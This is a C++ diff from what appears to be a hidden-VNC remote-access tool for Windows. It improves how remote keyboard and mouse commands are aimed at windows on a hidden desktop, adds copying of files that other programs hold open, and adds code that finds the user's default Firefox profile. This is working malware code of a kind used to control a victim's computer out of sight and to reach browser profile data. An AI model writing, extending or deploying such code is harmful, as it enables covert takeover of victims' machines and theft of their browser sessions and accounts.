@@ -1142,6 +1142,47 @@ static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
     return best;
 }
 
+static HWND smart_window_from_point(POINT pt);
+
+static BOOL CALLBACK FindWindowAtPointEnum(HWND hwnd, LPARAM lParam) {
+    struct Param {
+        POINT pt;
+        HWND result;
+    }* p = reinterpret_cast<Param*>(lParam);
+
+    if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+        RECT rect;
+        if (GetWindowRect(hwnd, &rect)) {
+            if (PtInRect(&rect, p->pt)) {
+                wchar_t className[256];
+                if (GetClassNameW(hwnd, className, 256)) {
+                    if (wcscmp(className, L"Progman") != 0 &&
+                        wcscmp(className, L"WorkerW") != 0 &&
+                        wcscmp(className, L"Shell_TrayWnd") != 0) {
+                        p->result = hwnd;
+                        return FALSE; // Found topmost window containing the point, stop enum
+                    }
+                }
+            }
+        }
+    }
+    return TRUE;
+}
+
+static HWND get_topmost_window_at_point(POINT pt) {
+    struct Param {
+        POINT pt;
+        HWND result;
+    } param = { pt, NULL };
+
+    EnumDesktopWindows(g_hHiddenDesktop, FindWindowAtPointEnum, reinterpret_cast<LPARAM>(&param));
+
+    if (param.result) {
+        return param.result;
+    }
+    return smart_window_from_point(pt);
+}
+
 static HWND smart_window_from_point(POINT pt) {
     const int WS_EX_TRANSPARENT_FLAG = 0x00000020;
 
@@ -1164,7 +1205,7 @@ static HWND smart_window_from_point(POINT pt) {
 }
 
 static HWND target_window_from_screen_point(POINT screenPt) {
-    HWND hwnd = smart_window_from_point(screenPt);
+    HWND hwnd = get_topmost_window_at_point(screenPt);
     if (!hwnd || !IsWindow(hwnd)) return NULL;
     return resolve_child_window_from_point(hwnd, screenPt);
 }
@@ -1173,11 +1214,11 @@ static bool is_context_menu_or_popup(HWND prevRoot, HWND root) {
     if (!root) return false;
     wchar_t cls[256] = {0};
     if (GetClassNameW(root, cls, 256)) {
-        if (wcscmp(cls, L"#32768") == 0) return true;
+        if (wcscmp(cls, L"#32768") == 0 || wcscmp(cls, L"MozillaDropShadowWindowClass") == 0) return true;
     }
     LONG style = GetWindowLongW(root, GWL_STYLE);
     bool isPopup = (style & WS_POPUP) != 0;
-    if (!isPopup) return false;
+    if (isPopup) return true;
     if (!prevRoot) return false;
     DWORD pidPrev = 0, pidNew = 0;
     GetWindowThreadProcessId(prevRoot, &pidPrev);
@@ -1195,8 +1236,18 @@ static bool is_taskbar(HWND hwnd) {
 }
 
 static void activate_window(HWND root, HWND hwnd) {
-    SetForegroundWindow(root);
-    SetActiveWindow(root);
+    HWND hFore = GetForegroundWindow();
+    DWORD forePid = 0;
+    if (hFore) {
+        GetWindowThreadProcessId(hFore, &forePid);
+    }
+    DWORD targetPid = 0;
+    GetWindowThreadProcessId(root, &targetPid);
+
+    if (forePid != targetPid) {
+        SetForegroundWindow(root);
+        SetActiveWindow(root);
+    }
     SetFocus(hwnd);
     g_hLastWindow = hwnd;
 }
@@ -1327,7 +1378,7 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = WindowFromPoint(g_lastMousePos);
+            HWND hTarget = get_topmost_window_at_point(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
@@ -1435,7 +1486,7 @@ static void input_loop() {
                                  SWP_NOZORDER | SWP_NOACTIVATE);
                 }
             } else {
-                HWND hwnd = smart_window_from_point(screenPt);
+                HWND hwnd = get_topmost_window_at_point(screenPt);
                 if (hwnd) {
                     activate_if_new_window(hwnd);
                     POINT clientPt = screenPt;
@@ -1461,9 +1512,10 @@ static void input_loop() {
             if (btn == 0) g_leftButtonDown = true;
 
             HWND hwnd = target_window_from_screen_point(screenPt);
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
+            if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                 if (!hRoot) hRoot = hwnd;
 
@@ -1559,9 +1611,10 @@ static void input_loop() {
 
             HWND hwnd = g_mouseDownTarget[btn];
             if (!hwnd || !IsWindow(hwnd)) hwnd = target_window_from_screen_point(screenPt);
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
+            if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                 if (!hRoot) hRoot = hwnd;
 
@@ -1617,9 +1670,13 @@ static void input_loop() {
             if (btn < 0 || btn > 2) btn = 0;
 
             HWND hwnd = target_window_from_screen_point(screenPt);
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
+            if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                 if (!hRoot) hRoot = hwnd;
 
@@ -1961,6 +2018,216 @@ static bool should_skip_dir(const wstring& name) {
         if (_wcsicmp(name.c_str(), skip.c_str()) == 0) return true;
     }
     return false;
+}
+
+static bool CopyFileWithSharing(const wchar_t* src, const wchar_t* dst) {
+    HANDLE hSrc = CreateFileW(src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hSrc == INVALID_HANDLE_VALUE) return false;
+
+    HANDLE hDst = CreateFileW(dst, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hDst == INVALID_HANDLE_VALUE) {
+        CloseHandle(hSrc);
+        return false;
+    }
+
+    const DWORD bufSize = 65536;
+    vector<char> buffer(bufSize);
+    DWORD bytesRead = 0;
+    DWORD bytesWritten = 0;
+    bool success = true;
+
+    while (ReadFile(hSrc, buffer.data(), bufSize, &bytesRead, NULL) && bytesRead > 0) {
+        if (!WriteFile(hDst, buffer.data(), bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
+            success = false;
+            break;
+        }
+    }
+
+    CloseHandle(hSrc);
+    CloseHandle(hDst);
+    return success;
+}
+
+// ============================================================================
+//  GECKO (FIREFOX) PROFILE RESOLUTION HELPERS
+// ============================================================================
+
+static wstring find_gecko_profile_fallback(const wstring& geckoUserDataDir) {
+    wstring profilesPath = geckoUserDataDir + L"\\Profiles";
+    wstring fallbackDir;
+    WIN32_FIND_DATAW findData;
+    HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            wstring name = findData.cFileName;
+            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && name != L"." && name != L"..") {
+                if (name.find(L".default-release") != wstring::npos) {
+                    fallbackDir = profilesPath + L"\\" + name;
+                    break;
+                } else if (name.find(L".default") != wstring::npos) {
+                    fallbackDir = profilesPath + L"\\" + name;
+                } else if (fallbackDir.empty()) {
+                    fallbackDir = profilesPath + L"\\" + name;
+                }
+            }
+        } while (FindNextFileW(hFind, &findData));
+        FindClose(hFind);
+    }
+    return fallbackDir;
+}
+
+struct IniSection {
+    wstring name;
+    vector<pair<wstring, wstring>> kvs;
+};
+
+static wstring resolve_gecko_profile_from_ini(const wstring& geckoUserDataDir) {
+    wstring iniPath = geckoUserDataDir + L"\\profiles.ini";
+    FILE* f = _wfopen(iniPath.c_str(), L"r, ccs=UTF-8");
+    if (!f) return L"";
+
+    vector<IniSection> sections;
+    wchar_t line[1024];
+    IniSection currentSection;
+    currentSection.name = L"";
+
+    while (fgetws(line, 1024, f)) {
+        wstring strLine = line;
+        while (!strLine.empty() && (strLine.back() == L'\r' || strLine.back() == L'\n' || strLine.back() == L' ' || strLine.back() == L'\t')) {
+            strLine.pop_back();
+        }
+        size_t startIdx = 0;
+        while (startIdx < strLine.size() && (strLine[startIdx] == L' ' || strLine[startIdx] == L'\t')) {
+            startIdx++;
+        }
+        if (startIdx > 0) {
+            strLine = strLine.substr(startIdx);
+        }
+        if (strLine.empty() || strLine[0] == L';' || strLine[0] == L'#') continue;
+
+        if (strLine[0] == L'[' && strLine.back() == L']') {
+            if (!currentSection.name.empty() || !currentSection.kvs.empty()) {
+                sections.push_back(currentSection);
+            }
+            currentSection.name = strLine.substr(1, strLine.size() - 2);
+            currentSection.kvs.clear();
+        } else {
+            size_t eq = strLine.find(L'=');
+            if (eq != wstring::npos) {
+                wstring key = strLine.substr(0, eq);
+                wstring val = strLine.substr(eq + 1);
+                while (!key.empty() && (key.back() == L' ' || key.back() == L'\t')) key.pop_back();
+                while (!val.empty() && (val.back() == L' ' || val.back() == L'\t')) val.pop_back();
+                currentSection.kvs.push_back({key, val});
+            }
+        }
+    }
+    if (!currentSection.name.empty() || !currentSection.kvs.empty()) {
+        sections.push_back(currentSection);
+    }
+    fclose(f);
+
+    wstring resolvedPath = L"";
+    bool isRelative = true;
+
+    // 1. Look for [Install...] default path
+    for (const auto& sec : sections) {
+        if (sec.name.rfind(L"Install", 0) == 0) {
+            for (const auto& kv : sec.kvs) {
+                if (kv.first == L"Default") {
+                    resolvedPath = kv.second;
+                    isRelative = true;
+                    break;
+                }
+            }
+        }
+        if (!resolvedPath.empty()) break;
+    }
+
+    // 2. If not found in [Install...], look for [Profile...] where Default=1
+    if (resolvedPath.empty()) {
+        for (const auto& sec : sections) {
+            if (sec.name.rfind(L"Profile", 0) == 0) {
+                bool isDef = false;
+                wstring pathVal = L"";
+                bool relVal = true;
+                for (const auto& kv : sec.kvs) {
+                    if (kv.first == L"Default" && kv.second == L"1") {
+                        isDef = true;
+                    } else if (kv.first == L"Path") {
+                        pathVal = kv.second;
+                    } else if (kv.first == L"IsRelative") {
+                        relVal = (kv.second == L"1");
+                    }
+                }
+                if (isDef && !pathVal.empty()) {
+                    resolvedPath = pathVal;
+                    isRelative = relVal;
+                    break;
+                }
+            }
+        }
+    }
+
+    // 3. Fallback to any [Profile...] containing "default-release" or "default"
+    if (resolvedPath.empty()) {
+        for (const auto& sec : sections) {
+            if (sec.name.rfind(L"Profile", 0) == 0) {
+                wstring pathVal = L"";
+                bool relVal = true;
+                bool isDefaultRelease = false;
+                for (const auto& kv : sec.kvs) {
+                    if (kv.first == L"Path") {
+                        pathVal = kv.second;
+                        if (pathVal.find(L"default-release") != wstring::npos) {
+                            isDefaultRelease = true;
+                        }
+                    } else if (kv.first == L"IsRelative") {
+                        relVal = (kv.second == L"1");
+                    }
+                }
+                if (isDefaultRelease && !pathVal.empty()) {
+                    resolvedPath = pathVal;
+                    isRelative = relVal;
+                    break;
+                }
+            }
+        }
+    }
+
+    // 4. Fallback to first [Profile...] if we still haven't resolved anything
+    if (resolvedPath.empty()) {
+        for (const auto& sec : sections) {
+            if (sec.name.rfind(L"Profile", 0) == 0) {
+                wstring pathVal = L"";
+                bool relVal = true;
+                for (const auto& kv : sec.kvs) {
+                    if (kv.first == L"Path") {
+                        pathVal = kv.second;
+                    } else if (kv.first == L"IsRelative") {
+                        relVal = (kv.second == L"1");
+                    }
+                }
+                if (!pathVal.empty()) {
+                    resolvedPath = pathVal;
+                    isRelative = relVal;
+                    break;
+                }
+            }
+        }
+    }
+
+    if (!resolvedPath.empty()) {
+        for (size_t i = 0; i < resolvedPath.size(); i++) {
+            if (resolvedPath[i] == L'/') resolvedPath[i] = L'\\';
+        }
+        if (isRelative) {
+            return geckoUserDataDir + L"\\" + resolvedPath;
+        } else {
+            return resolvedPath;
+        }
+    }
+    return L"";
 }
 
 static void collect_file_pairs(const fs::path& src, const fs::path& dst, vector<pair<wstring, wstring>>& tasks) {
